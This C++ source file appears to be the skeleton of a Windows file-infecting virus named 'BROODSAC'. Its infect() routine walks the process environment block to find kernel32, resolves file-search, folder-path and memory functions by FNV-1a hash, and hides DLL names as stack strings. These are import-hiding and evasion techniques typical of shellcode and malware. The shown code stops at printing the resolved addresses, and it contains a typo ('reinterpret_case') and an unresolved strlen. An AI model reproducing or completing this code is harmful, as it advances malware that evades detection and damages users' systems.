#include <cstdint>
#include <iostream>

#include <windows.h>
#include <winternl.h>
#include <shlobj.h>

typedef struct FULL_PEB_LDR_DATA
{
   ULONG Length;
   BOOLEAN Initialized;
   HANDLE SsHandle;
   LIST_ENTRY InLoadOrderModuleList;
   LIST_ENTRY InMemoryOrderModuleList;
   LIST_ENTRY InInitializationOrderModuleList;
   PVOID EntryInProgress;
   BOOLEAN ShutdownInProgress;
   HANDLE ShutdownThreadId;
} FULL_PEB_LDR_DATA, *PFULL_PEB_LDR_DATA;

typedef struct FULL_LDR_DATA_TABLE_ENTRY
{
     LIST_ENTRY InLoadOrderLinks;
     LIST_ENTRY InMemoryOrderLinks;
     LIST_ENTRY InInitializationOrderLinks;
     PVOID DllBase;
     PVOID EntryPoint;
     ULONG SizeOfImage;
     UNICODE_STRING FullDllName;
     UNICODE_STRING BaseDllName;
     ULONG Flags;
     WORD LoadCount;
     WORD TlsIndex;
     union
     {
          LIST_ENTRY HashLinks;
          struct
          {
               PVOID SectionPointer;
               ULONG CheckSum;
          };
     };
     union
     {
          ULONG TimeDateStamp;
          PVOID LoadedImports;
     };
     PVOID EntryPointActivationContext;
     PVOID PatchInformation;
     LIST_ENTRY ForwarderLinks;
     LIST_ENTRY ServiceTagLinks;
     LIST_ENTRY StaticLinks;
} FULL_LDR_DATA_TABLE_ENTRY, *PFULL_LDR_DATA_TABLE_ENTRY;

std::uint32_t fnv321a(const char *string)
{
   std::uint32_t hashval = 0x811c9dc5;

   if (string == nullptr)
      return hashval;

   while (*string != 0)
   {
      hashval ^= *string++;
      hashval *= 0x01000193;
   }

   return hashval;
}

LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, std::uint32_t hash)
{
   const IMAGE_NT_HEADERS *nt_headers = reinterpret_cast<const IMAGE_NT_HEADERS *>(reinterpret_cast<const std::uint8_t *>(module)+module->e_lfanew);
   const IMAGE_EXPORT_DIRECTORY *export_directory = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY *>(
      reinterpret_cast<const std::uint8_t *>(module)+nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
   const DWORD *name_pointers = reinterpret_cast<const DWORD *>(reinterpret_cast<const std::uint8_t *>(module)+export_directory->AddressOfNames);
   const WORD *name_ordinals = reinterpret_cast<const WORD *>(reinterpret_cast<const std::uint8_t *>(module)+export_directory->AddressOfNameOrdinals);
   const DWORD *functions = reinterpret_cast<const DWORD *>(reinterpret_cast<const std::uint8_t *>(module)+export_directory->AddressOfFunctions);

   for (std::uint32_t i=0; i<export_directory->NumberOfNames; ++i)
   {
      const char *name = reinterpret_cast<const char *>(reinterpret_cast<const std::uint8_t *>(module)+name_pointers[i]);

      if (fnv321a(name) != hash)
         continue;

      return reinterpret_cast<LPCVOID>(reinterpret_cast<const std::uint8_t *>(module)+functions[name_ordinals[i]]);
   }

   return nullptr;
}

typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
typedef void * (* mallocHeader)(std::size_t);
typedef void * (* reallocHeader)(void *, std::size_t);
typedef void (* freeHeader)(void *);
typedef char * (* strncatHeader)(char *, const char *, std::size_t);
typedef std::size_t (* strlenHeader)(const char *);
typedef void * (* memcpyHeader)(void *, const void *, std::size_t);
typedef HANDLE (* FindFirstFileAHeader)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL (* FindNextFileAHeader)(HANDLE, LPWIN32_FIND_DATAA);
typedef HRESULT (__stdcall *SHGetFolderPathAHeader)(HWND, int, HANDLE, DWORD, LPSTR);

void infect(void)
{
#if defined(BROODSAC32)
   PPEB peb = reinterpret_case<PPEB>(__readfsdword(0x30));
#elif defined(BROODSAC64)
   PPEB peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#endif

   PFULL_PEB_LDR_DATA ldr = reinterpret_cast<PFULL_PEB_LDR_DATA>(peb->Ldr);
   PLIST_ENTRY list_entry = ldr->InLoadOrderModuleList.Flink;
   PFULL_LDR_DATA_TABLE_ENTRY kernel32 = nullptr;

   while (list_entry != nullptr)
   {
      PFULL_LDR_DATA_TABLE_ENTRY table_entry = reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(list_entry);

      if (table_entry->BaseDllName.Buffer == nullptr)
      {
         list_entry = nullptr;
         continue;
      }

      if (*reinterpret_cast<std::uint64_t *>(table_entry->BaseDllName.Buffer) == 0x4e00520045004b) // L"KERN"
      {
         kernel32 = table_entry;
         break;
      }
      
      list_entry = table_entry->InLoadOrderLinks.Flink;
   }

   if (kernel32 == nullptr)
      return;

   LoadLibraryAHeader loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
   FindFirstFileAHeader findFirstFile = reinterpret_cast<FindFirstFileAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xd7482f55));
   FindNextFileAHeader findNextFile = reinterpret_cast<FindNextFileAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x6f4d1398));
   char msvcrtDll[] = {'m','s','v','c','r','t','.','d','l','l',0};
   PIMAGE_DOS_HEADER msvcrtModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(msvcrtDll));
   mallocHeader malloc = reinterpret_cast<mallocHeader>(get_proc_by_hash(msvcrtModule, 0x558c274d));
   reallocHeader realloc = reinterpret_cast<reallocHeader>(get_proc_by_hash(msvcrtModule, 0xbf26b345));
   freeHeader free = reinterpret_cast<freeHeader>(get_proc_by_hash(msvcrtModule, 0x99b3eedb));
   strncatHeader strncat = reinterpret_cast<strncatHeader>(get_proc_by_hash(msvcrtModule, 0xb1ee6f2e));
   memcpyHeader memcpy = reinterpret_cast<memcpyHeader>(get_proc_by_hash(msvcrtModule, 0xa45cec64));
   char shell32Dll[] = {'s','h','e','l','l','3','2','.','d','l','l',0};
   PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(shell32Dll));
   SHGetFolderPathAHeader getFolderPath = reinterpret_cast<SHGetFolderPathAHeader>(get_proc_by_hash(shell32Module, 0xe8692330));

   std::wcout << "msvcrt: " << std::hex << (std::uintptr_t)msvcrtModule << std::endl;
   std::wcout << "shell32: " << std::hex << (std::uintptr_t)shell32Module << std::endl;
   std::wcout << "malloc: " << std::hex << (std::uintptr_t)malloc << std::endl;
   std::wcout << "realloc: " << std::hex << (std::uintptr_t)realloc << std::endl;
   std::wcout << "free: " << std::hex << (std::uintptr_t)free << std::endl;
   std::wcout << "strncat: " << std::hex << (std::uintptr_t)strncat << std::endl;
   std::wcout << "strlen: " << std::hex << (std::uintptr_t)strlen << std::endl;
   std::wcout << "memcpy: " << std::hex << (std::uintptr_t)memcpy << std::endl;
   std::wcout << "FindFirstFileA: " << std::hex << (std::uintptr_t)findFirstFile << std::endl;
   std::wcout << "FindNextFileA: " << std::hex << (std::uintptr_t)findNextFile << std::endl;
   std::wcout << "SHGetFolderPathA: " << std::hex << (std::uintptr_t)getFolderPath << std::endl;
}

int wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
{
   infect();
   return 0;
}
